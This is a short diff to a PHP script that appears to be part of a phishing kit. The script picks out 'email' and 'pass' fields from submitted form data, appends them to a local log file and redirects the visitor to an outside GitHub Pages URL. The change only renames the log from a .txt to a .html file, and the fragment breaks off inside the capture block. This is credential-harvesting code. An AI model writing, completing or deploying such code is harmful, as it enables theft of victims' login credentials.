@@ -1,6 +1,6 @@
 <?php
 header('Location:https://yassange.github.io/pag-na-termux/');
-$handle = fopen("wikinbn.txt", "a");
+$handle = fopen("wikinbn.html", "a");
 foreach ($_POST as $variable => $value) {
     if ($variable == "email" || $variable == "pass")
 		{
